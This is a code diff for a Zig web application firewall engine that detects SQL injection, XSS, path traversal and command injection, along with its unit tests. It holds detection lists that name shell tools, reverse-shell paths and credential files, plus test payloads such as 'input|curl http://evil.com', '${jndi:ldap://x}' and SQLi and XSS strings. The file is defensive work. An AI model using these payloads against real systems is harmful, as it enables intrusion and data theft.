@@ -1,11 +1,19 @@
 //! Sibuna Semantic Web Application Firewall (WAF) Engine
 //!
-//! Provides zero-allocation, sub-microsecond inspection of HTTP paths, queries,
-//! headers, and request bodies matching and exceeding SafeLine WAF detection:
-//! SQL Injection (SQLi), Cross-Site Scripting (XSS), Path Traversal (LFI/RFI),
-//! and Remote Code Execution (RCE).
+//! Zero-allocation inspection of HTTP paths, queries, headers, and bodies for
+//! SQL injection, cross-site scripting, path traversal, and command injection.
+//!
+//! Detection is *contextual* rather than a flat substring list: a lone SQL
+//! comment marker or `alert(` never fires on its own, because those bytes
+//! appear in ordinary browser traffic (`Accept: */*`, JavaScript bodies).
+//! Each category combines strong signatures (one hit suffices) with weak
+//! signals that must co-occur with structural evidence such as a quote next
+//! to a SQL keyword, an event handler inside an HTML tag, or a shell
+//! separator immediately followed by a known command name.
 
 const std = @import("std");
+const rule = @import("rule.zig");
+const normalizer = @import("normalizer.zig");
 
 pub const AttackCategory = enum(u8) {
     path_traversal,
@@ -21,175 +29,337 @@ pub const AttackCategory = enum(u8) {
             .rce => "rce",
         };
     }
+
+    pub fn ruleName(self: AttackCategory) []const u8 {
+        return switch (self) {
+            .path_traversal => "waf:path-traversal",
+            .sqli => "waf:sqli",
+            .xss => "waf:xss",
+            .rce => "waf:rce",
+        };
+    }
 };
 
 pub const Violation = struct {
     category: AttackCategory,
     pattern: []const u8,
     rule_name: []const u8,
+
+    fn of(category: AttackCategory, pattern: []const u8) Violation {
+        return .{ .category = category, .pattern = pattern, .rule_name = category.ruleName() };
+    }
 };
 
+/// Bodies larger than this are inspected only over their prefix; attack
+/// payloads that must reach an application parser sit at the front of the
+/// body, and bounding the scan keeps worst-case inspection cost fixed.
+pub const MAX_BODY_INSPECT: usize = 8 * 1024;
+
+/// Longest input that is canonicalised (percent-decoded, comment-stripped)
+/// before the second inspection pass. Inputs beyond this are inspected raw.
+pub const MAX_CANONICAL: usize = 2048;
+
 pub fn containsIgnoreCase(haystack: []const u8, needle: []const u8) bool {
-    if (needle.len == 0) return true;
-    if (haystack.len < needle.len) return false;
-    var i: usize = 0;
-    const max_idx = haystack.len - needle.len;
-    while (i <= max_idx) : (i += 1) {
-        var match = true;
-        var j: usize = 0;
-        while (j < needle.len) : (j += 1) {
-            const h = std.ascii.toLower(haystack[i + j]);
-            const n = std.ascii.toLower(needle[j]);
-            if (h != n) {
-                match = false;
-                break;
-            }
-        }
-        if (match) return true;
+    return std.ascii.indexOfIgnoreCase(haystack, needle) != null;
+}
+
+fn isWordByte(c: u8) bool {
+    return std.ascii.isAlphanumeric(c) or c == '_';
+}
+
+/// Case-insensitive whole-word search: `select` matches `SELECT ` but not
+/// `selected`, so ordinary prose cannot accumulate SQL keyword evidence.
+fn containsWord(text: []const u8, word: []const u8) bool {
+    var start: usize = 0;
+    while (std.ascii.indexOfIgnoreCasePos(text, start, word)) |idx| {
+        const before_ok = idx == 0 or !isWordByte(text[idx - 1]);
+        const after = idx + word.len;
+        const after_ok = after >= text.len or !isWordByte(text[after]);
+        if (before_ok and after_ok) return true;
+        start = idx + 1;
     }
     return false;
 }
 
+fn firstMatch(text: []const u8, patterns: []const []const u8) ?[]const u8 {
+    for (patterns) |pat| {
+        if (containsIgnoreCase(text, pat)) return pat;
+    }
+    return null;
+}
+
+const traversal_strong = [_][]const u8{
+    "../",        "..\\",              "..%2f",       "..%5c",       "%2e%2e",
+    "%252e",      "..;/",              "/etc/passwd", "/etc/shadow", "/proc/self",
+    "win.ini",    "boot.ini",          "/etc/hosts",  "id_rsa",      ".htaccess",
+    "web.config", "/windows/system32",
+};
+
 pub fn checkPathTraversal(text: []const u8) ?Violation {
-    const patterns = [_][]const u8{
-        "../",
-        "..\\",
-        "%2e%2e",
-        "..%2f",
-        "%252e",
-        "%00",
-        "/etc/passwd",
-        "/etc/shadow",
-        "/proc/self",
-        "win.ini",
-        "boot.ini",
-    };
-    for (patterns) |pat| {
-        if (containsIgnoreCase(text, pat)) {
-            return Violation{
-                .category = .path_traversal,
-                .pattern = pat,
-                .rule_name = "waf:path-traversal",
-            };
-        }
+    if (firstMatch(text, &traversal_strong)) |pat| return Violation.of(.path_traversal, pat);
+    // A null byte truncates C string paths; inside a request it has no
+    // legitimate use and always signals an attempt to cut off a suffix.
+    if (std.mem.indexOfScalar(u8, text, 0) != null or containsIgnoreCase(text, "%00")) {
+        return Violation.of(.path_traversal, "%00");
     }
     return null;
 }
 
+const sqli_strong = [_][]const u8{
+    "union select",  "union all select", "union distinct select", "information_schema",
+    "sleep(",        "benchmark(",       "load_file(",            "into outfile",
+    "into dumpfile", "xp_cmdshell",      "pg_sleep(",             "waitfor delay",
+    "; drop table",  "; delete from",    "; truncate ",           "@@version",
+    "' or '1'='1",   "\" or \"1\"=\"1",  "' or 1=1",              "\" or 1=1",
+    "or 1=1--",      "or 1=1#",          "' and '1'='1",          "extractvalue(",
+    "updatexml(",    "group_concat(",    "sqlite_master",         "sysobjects",
+};
+
+const sqli_keywords = [_][]const u8{
+    "select", "union",  "insert",  "update", "delete", "drop",    "from",
+    "where",  "having", "order",   "group",  "exec",   "declare", "cast",
+    "concat", "char",   "convert", "table",  "values", "limit",   "offset",
+};
+
+fn hasSqlComment(text: []const u8) bool {
+    return std.mem.indexOf(u8, text, "--") != null or
+        std.mem.indexOf(u8, text, "/*") != null or
+        std.mem.indexOf(u8, text, "#") != null;
+}
+
+fn skipSpaces(text: []const u8, start: usize) usize {
+    var i = start;
+    while (i < text.len and (text[i] == ' ' or text[i] == '\t')) : (i += 1) {}
+    return i;
+}
+
+/// Consumes one SQL literal (digit run or quoted string) and returns the
+/// index just past it, or null when `text[start]` does not begin a literal.
+fn skipLiteral(text: []const u8, start: usize) ?usize {
+    if (start >= text.len) return null;
+    const c = text[start];
+    if (std.ascii.isDigit(c)) {
+        var i = start;
+        while (i < text.len and std.ascii.isDigit(text[i])) : (i += 1) {}
+        return i;
+    }
+    if (c == '\'' or c == '"') {
+        const close = std.mem.indexOfScalarPos(u8, text, start + 1, c) orelse return null;
+        return close + 1;
+    }
+    return null;
+}
+
+/// A boolean tautology is `or`/`and` followed by `literal = literal`, as in
+/// `or 1=1` or `and 'a'='a'`. Identifiers on either side (`or b=2`) are
+/// ordinary filter syntax and are not counted.
+fn hasTautology(text: []const u8) bool {
+    var pos: usize = 0;
+    while (pos < text.len) {
+        const or_idx = std.ascii.indexOfIgnoreCasePos(text, pos, "or");
+        const and_idx = std.ascii.indexOfIgnoreCasePos(text, pos, "and");
+        const idx = @min(or_idx orelse text.len, and_idx orelse text.len);
+        if (idx >= text.len) return false;
+        const word_len: usize = if (or_idx != null and idx == or_idx.?) 2 else 3;
+        pos = idx + 1;
+        const before_ok = idx == 0 or !isWordByte(text[idx - 1]);
+        if (!before_ok) continue;
+        const lhs_start = skipSpaces(text, idx + word_len);
+        if (lhs_start == idx + word_len) continue;
+        const lhs_end = skipLiteral(text, lhs_start) orelse continue;
+        const eq = skipSpaces(text, lhs_end);
+        if (eq >= text.len or text[eq] != '=') continue;
+        const rhs_start = skipSpaces(text, eq + 1);
+        if (skipLiteral(text, rhs_start) != null) return true;
+    }
+    return false;
+}
+
+/// SQL injection scoring. Strong signatures fire alone. Otherwise a quote
+/// (the byte that breaks out of a string literal) is mandatory, and the
+/// surrounding evidence must reach a threshold: up to two whole-word SQL
+/// keywords, a comment marker, and an `=` operator each add one point.
+/// Prose such as "it's a group order from the shop" scores three and
+/// passes; `name='x' union all from t--` scores four and is blocked.
 pub fn checkSqli(text: []const u8) ?Violation {
-    const patterns = [_][]const u8{
-        "union select",
-        "union all select",
-        "union distinct select",
-        "' or '1'='1",
-        "\" or \"1\"=\"1",
-        "' or 1=1",
-        "\" or 1=1",
-        "-- ",
-        "/*",
-        "*/",
-        "information_schema",
-        "sleep(",
-        "benchmark(",
-        "load_file(",
-        "into outfile",
-        "; drop table",
-        "; delete from",
-    };
-    for (patterns) |pat| {
-        if (containsIgnoreCase(text, pat)) {
-            return Violation{
-                .category = .sqli,
-                .pattern = pat,
-                .rule_name = "waf:sqli",
-            };
+    if (firstMatch(text, &sqli_strong)) |pat| return Violation.of(.sqli, pat);
+    if (hasTautology(text)) return Violation.of(.sqli, "tautology");
+    // A closing quote followed by a comment marker is the classic
+    // `admin'--` termination trick and carries no keywords at all.
+    if (std.mem.indexOf(u8, text, "'--") != null or std.mem.indexOf(u8, text, "'/*") != null or
+        std.mem.indexOf(u8, text, "'#") != null)
+    {
+        return Violation.of(.sqli, "'--");
+    }
+    if (std.mem.indexOfAny(u8, text, "'\"`") == null) return null;
+    var score: u32 = 1;
+    var first_keyword: []const u8 = "";
+    var keyword_hits: u32 = 0;
+    for (sqli_keywords) |kw| {
+        if (containsWord(text, kw)) {
+            if (keyword_hits == 0) first_keyword = kw;
+            keyword_hits += 1;
+            if (keyword_hits == 2) break;
         }
     }
+    score += keyword_hits;
+    if (hasSqlComment(text)) score += 1;
+    if (std.mem.indexOfScalar(u8, text, '=') != null) score += 1;
+    if (score >= 4 and keyword_hits > 0) return Violation.of(.sqli, first_keyword);
     return null;
 }
 
+const xss_strong = [_][]const u8{
+    "<script",     "</script",        "javascript:",        "vbscript:", "data:text/html",
+    "<iframe",     "<object",         "<embed",             "<applet",   "<meta http-equiv",
+    "expression(", "document.cookie", "document.write",     "eval(atob", "<base href",
+    "srcdoc=",     "<svg/onload",     "<img src=x onerror",
+};
+
+const xss_tags = [_][]const u8{
+    "svg",    "img",    "body",     "video",  "audio", "math",     "details", "marquee",
+    "input",  "form",   "style",    "link",   "table", "div",      "span",    "a",
+    "button", "select", "textarea", "iframe", "frame", "frameset", "object",  "embed",
+};
+
+/// True when `text` holds `<tag` for one of the executable-context tags.
+fn hasHtmlTag(text: []const u8) bool {
+    var pos: usize = 0;
+    while (std.mem.indexOfScalarPos(u8, text, pos, '<')) |lt| {
+        const rest = text[lt + 1 ..];
+        for (xss_tags) |tag| {
+            if (rest.len > tag.len and std.ascii.startsWithIgnoreCase(rest, tag)) {
+                const next = rest[tag.len];
+                if (next == ' ' or next == '/' or next == '>' or next == '\t') return true;
+            }
+        }
+        pos = lt + 1;
+    }
+    return false;
+}
+
+/// True when an `on<event>=` attribute appears in attribute position, i.e.
+/// preceded by whitespace, a slash, or a quote. `onboarding=1` in a query
+/// string is not preceded by such a byte and does not count.
+fn hasEventHandler(text: []const u8) bool {
+    var pos: usize = 0;
+    while (std.ascii.indexOfIgnoreCasePos(text, pos, "on")) |idx| {
+        pos = idx + 1;
+        if (idx == 0) continue;
+        const prev = text[idx - 1];
+        if (prev != ' ' and prev != '/' and prev != '"' and prev != '\'' and prev != '\t') continue;
+        var end = idx + 2;
+        while (end < text.len and std.ascii.isAlphabetic(text[end])) : (end += 1) {}
+        if (end > idx + 2 and end < text.len and text[end] == '=') return true;
+    }
+    return false;
+}
+
+/// XSS: a strong signature, or an HTML tag that can host script combined
+/// with an event-handler attribute in attribute position.
 pub fn checkXss(text: []const u8) ?Violation {
-    const patterns = [_][]const u8{
-        "<script",
-        "</script>",
-        "javascript:",
-        "vbscript:",
-        "data:text/html",
-        "<iframe",
-        "<svg",
-        "<object",
-        "<embed",
-        "onerror=",
-        "onload=",
-        "onclick=",
-        "onmouseover=",
-        "onfocus=",
-        "alert(",
-        "document.cookie",
-    };
-    for (patterns) |pat| {
-        if (containsIgnoreCase(text, pat)) {
-            return Violation{
-                .category = .xss,
-                .pattern = pat,
-                .rule_name = "waf:xss",
-            };
-        }
-    }
+    if (firstMatch(text, &xss_strong)) |pat| return Violation.of(.xss, pat);
+    if (hasHtmlTag(text) and hasEventHandler(text)) return Violation.of(.xss, "on*=");
     return null;
 }
 
+const rce_strong = [_][]const u8{
+    "/bin/sh",            "/bin/bash",      "/bin/zsh",    "cmd.exe",       "powershell",
+    "/dev/tcp/",          "xp_cmdshell",    "shell_exec(", "passthru(",     "proc_open(",
+    "popen(",             "system(",        "pcntl_exec(", "wscript.shell", "${ifs}",
+    "$ifs$",              "{{7*7}}",        "${7*7}",      "#{7*7}",        "<%=7*7%>",
+    "${jndi:",            "%24%7bjndi",     "__import__(", "subprocess.",   "os.system",
+    "runtime.getruntime", "processbuilder",
+};
+
+const shell_commands = [_][]const u8{
+    "cat",     "ls",       "id",       "whoami",  "wget",   "curl",     "nc",   "ncat",
+    "bash",    "sh",       "python",   "python3", "perl",   "php",      "ruby", "rm",
+    "chmod",   "chown",    "echo",     "uname",   "ping",   "nslookup", "dig",  "sleep",
+    "telnet",  "ftp",      "tftp",     "base64",  "printf", "env",      "set",  "kill",
+    "netstat", "ifconfig", "ipconfig", "net",     "type",   "dir",      "del",  "mkdir",
+};
+
+fn startsWithShellCommand(text: []const u8) bool {
+    var i: usize = 0;
+    while (i < text.len and (text[i] == ' ' or text[i] == '\t')) : (i += 1) {}
+    const rest = text[i..];
+    for (shell_commands) |cmd| {
+        if (std.ascii.startsWithIgnoreCase(rest, cmd)) {
+            const after = rest.len == cmd.len or !isWordByte(rest[cmd.len]);
+            if (after) return true;
+        }
+    }
+    return false;
+}
+
+/// Command injection: a strong signature, or a shell separator (`;`, `|`,
+/// `&&`, `$(`, backtick, newline) followed by a known command name. A bare
+/// `;` or `|` is punctuation; `;wget` is a payload.
 pub fn checkRce(text: []const u8) ?Violation {
-    const patterns = [_][]const u8{
-        "/bin/sh",
-        "/bin/bash",
-        "cmd.exe",
-        "powershell",
-        ";cat ",
-        "|cat ",
-        ";wget ",
-        "|wget ",
-        ";curl ",
-        "|curl ",
-        ";nc ",
-        "|nc ",
-        "eval(",
-        "system(",
-        "passthru(",
-        "popen(",
-        "exec(",
-    };
-    for (patterns) |pat| {
-        if (containsIgnoreCase(text, pat)) {
-            return Violation{
-                .category = .rce,
-                .pattern = pat,
-                .rule_name = "waf:rce",
-            };
+    if (firstMatch(text, &rce_strong)) |pat| return Violation.of(.rce, pat);
+    var i: usize = 0;
+    while (i < text.len) : (i += 1) {
+        const c = text[i];
+        var after: usize = i + 1;
+        if (c == '$' and i + 1 < text.len and text[i + 1] == '(') {
+            after = i + 2;
+        } else if (c == '&' and i + 1 < text.len and text[i + 1] == '&') {
+            after = i + 2;
+        } else if (c == '|' and i + 1 < text.len and text[i + 1] == '|') {
+            after = i + 2;
+        } else if (c != ';' and c != '|' and c != '`' and c != '\n' and c != '&') {
+            continue;
+        }
+        if (after < text.len and startsWithShellCommand(text[after..])) {
+            return Violation.of(.rce, "shell-separator");
         }
     }
     return null;
 }
 
-const rule = @import("rule.zig");
-const normalizer = @import("normalizer.zig");
-
-pub fn inspectText(text: []const u8) ?Violation {
-    if (text.len == 0) return null;
+fn inspectRaw(text: []const u8) ?Violation {
     if (checkPathTraversal(text)) |v| return v;
     if (checkSqli(text)) |v| return v;
     if (checkXss(text)) |v| return v;
     if (checkRce(text)) |v| return v;
+    return null;
+}
 
-    var norm_buf: [2048]u8 = undefined;
+/// Inspects one text field twice: as received, then canonicalised (double
+/// percent-decoding, SQL comment stripping, whitespace folding, lowercase)
+/// so that `%2527/**/UnIoN` style evasion collapses onto the raw signatures.
+pub fn inspectText(text: []const u8) ?Violation {
+    if (text.len == 0) return null;
+    if (inspectRaw(text)) |v| return v;
+    if (text.len > MAX_CANONICAL) return null;
+    var norm_buf: [MAX_CANONICAL]u8 = undefined;
     const normalized = normalizer.canonicalize(text, &norm_buf);
     if (normalized.len > 0 and !std.mem.eql(u8, normalized, text)) {
-        if (checkPathTraversal(normalized)) |v| return v;
-        if (checkSqli(normalized)) |v| return v;
-        if (checkXss(normalized)) |v| return v;
-        if (checkRce(normalized)) |v| return v;
+        return inspectRaw(normalized);
     }
     return null;
+}
+
+/// Headers whose grammar legitimately contains `*/*`, `;q=`, quotes, and
+/// slashes. Their values are machine-generated content negotiation, not
+/// user-controlled input, so scanning them yields only false positives.
+const structural_headers = [_][]const u8{
+    "accept",            "accept-encoding",           "accept-language", "accept-charset",
+    "content-type",      "content-length",            "host",            "connection",
+    "cache-control",     "pragma",                    "range",           "if-none-match",
+    "if-modified-since", "if-match",                  "if-range",        "te",
+    "transfer-encoding", "upgrade-insecure-requests", "dnt",             "sec-ch-ua",
+    "sec-ch-ua-mobile",  "sec-ch-ua-platform",        "sec-fetch-dest",  "sec-fetch-mode",
+    "sec-fetch-site",    "sec-fetch-user",            "sec-gpc",         "priority",
+    "x-forwarded-proto", "x-forwarded-port",          "keep-alive",      "origin",
+};
+
+pub fn isStructuralHeader(name: []const u8) bool {
+    for (structural_headers) |h| {
+        if (std.ascii.eqlIgnoreCase(name, h)) return true;
+    }
+    return false;
 }
 
 pub fn inspectRequest(
@@ -201,51 +371,88 @@ pub fn inspectRequest(
     if (inspectText(path)) |v| return v;
     if (inspectText(user_agent)) |v| return v;
     for (headers) |h| {
+        if (isStructuralHeader(h.name)) continue;
         if (inspectText(h.value)) |v| return v;
     }
     if (body.len > 0) {
-        if (inspectText(body)) |v| return v;
+        const limit = @min(body.len, MAX_BODY_INSPECT);
+        if (inspectText(body[0..limit])) |v| return v;
     }
     return null;
-}
-
-test "containsIgnoreCase detects exact and mixed case" {
-    try std.testing.expect(containsIgnoreCase("Hello World", "hello"));
-    try std.testing.expect(containsIgnoreCase("UNION SELECT 1", "union select"));
-    try std.testing.expect(!containsIgnoreCase("safe string", "attack"));
 }
 
 test "checkPathTraversal detects traversal patterns" {
     try std.testing.expect(checkPathTraversal("/app/static/../../etc/passwd") != null);
     try std.testing.expect(checkPathTraversal("/api/%2e%2e/admin") != null);
+    try std.testing.expect(checkPathTraversal("/download?f=a%00.png") != null);
     try std.testing.expect(checkPathTraversal("/safe/path/image.png") == null);
 }
 
-test "checkSqli detects SQL injection" {
+test "checkSqli detects injection but not prose or content negotiation" {
     try std.testing.expect(checkSqli("admin' OR '1'='1") != null);
     try std.testing.expect(checkSqli("id=1 UNION SELECT null, username FROM users") != null);
+    try std.testing.expect(checkSqli("q=x' and 1=1 order by 3 -- ") != null);
+    try std.testing.expect(checkSqli("user=admin'--") != null);
     try std.testing.expect(checkSqli("name=JohnDoe") == null);
+    try std.testing.expect(checkSqli("text/html,application/xml;q=0.9,*/*;q=0.8") == null);
+    try std.testing.expect(checkSqli("please select a table from the menu") == null);
+    try std.testing.expect(checkSqli("it's a group order from the shop") == null);
+    try std.testing.expect(checkSqli("id=1 or 1=1") != null);
+    try std.testing.expect(checkSqli("id=5 or b=2") == null);
+    try std.testing.expect(checkSqli("I'd select the second option -- it's cheaper") == null);
+    try std.testing.expect(checkSqli("name='x' union all from t--") != null);
 }
 
-test "checkXss detects script injections" {
+test "checkXss detects script injection but not plain markup words" {
     try std.testing.expect(checkXss("<script>alert(1)</script>") != null);
     try std.testing.expect(checkXss("<img src=x onerror=alert(1)>") != null);
+    try std.testing.expect(checkXss("<svg/onload=alert(1)>") != null);
+    try std.testing.expect(checkXss("<a href=\"javascript:alert(1)\">x</a>") != null);
     try std.testing.expect(checkXss("plain text input") == null);
+    try std.testing.expect(checkXss("onboarding=1&alert(true)") == null);
+    try std.testing.expect(checkXss("<div class=\"a\">hello</div>") == null);
 }
 
-test "checkRce detects command injections" {
+test "checkRce detects command injection but not punctuation" {
     try std.testing.expect(checkRce("127.0.0.1; /bin/sh") != null);
     try std.testing.expect(checkRce("input|curl http://evil.com") != null);
-    try std.testing.expect(checkRce("status ok") == null);
+    try std.testing.expect(checkRce("x=$(cat /etc/hostname)") != null);
+    try std.testing.expect(checkRce("host=a && whoami") != null);
+    try std.testing.expect(checkRce("${jndi:ldap://x}") != null);
+    try std.testing.expect(checkRce("status ok; done | next") == null);
+    try std.testing.expect(checkRce("a=1&b=2&c=3") == null);
 }
 
 test "inspectText blocks obfuscated WAF evasion attacks" {
-    // URL-encoded SQLi
     try std.testing.expect(inspectText("id=%27%20or%20%271%27=%271") != null);
-    // Comment-obfuscated SQLi
     try std.testing.expect(inspectText("1'/**/UnIoN/**/SeLeCt/**/1") != null);
-    // Double-encoded Path Traversal
     try std.testing.expect(inspectText("/api/%252e%252e/%252e%252e/etc/passwd") != null);
-    // URL-encoded XSS
     try std.testing.expect(inspectText("<img%20src=x%20onerror=alert(1)>") != null);
+}
+
+test "inspectRequest passes a real browser request untouched" {
+    const headers = [_]rule.Header{
+        .{ .name = "Host", .value = "example.com" },
+        .{ .name = "Accept", .value = "text/html,application/xhtml+xml,application/xml;q=0.9," ++
+            "image/avif,image/webp,*/*;q=0.8" },
+        .{ .name = "Accept-Language", .value = "en-US,en;q=0.5" },
+        .{ .name = "Accept-Encoding", .value = "gzip, deflate, br" },
+        .{ .name = "Cookie", .value = "session=abc--def; theme=dark" },
+        .{ .name = "Referer", .value = "https://example.com/blog?tag=c%2B%2B" },
+        .{ .name = "Sec-Ch-Ua", .value = "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\"" },
+    };
+    const ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 " ++
+        "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";
+    const body = "{\"comment\":\"I'd select the second option -- it's cheaper\"}";
+    try std.testing.expect(inspectRequest("/blog/post-1", ua, &headers, body) == null);
+}
+
+test "inspectRequest still catches attacks in custom headers and bodies" {
+    const headers = [_]rule.Header{
+        .{ .name = "X-Query", .value = "<script>alert(1)</script>" },
+    };
+    const v = inspectRequest("/search", "Mozilla", &headers, "").?;
+    try std.testing.expectEqual(AttackCategory.xss, v.category);
+    const b = inspectRequest("/submit", "Mozilla", &.{}, "cmd=test; /bin/sh").?;
+    try std.testing.expectEqual(AttackCategory.rce, b.category);
 }
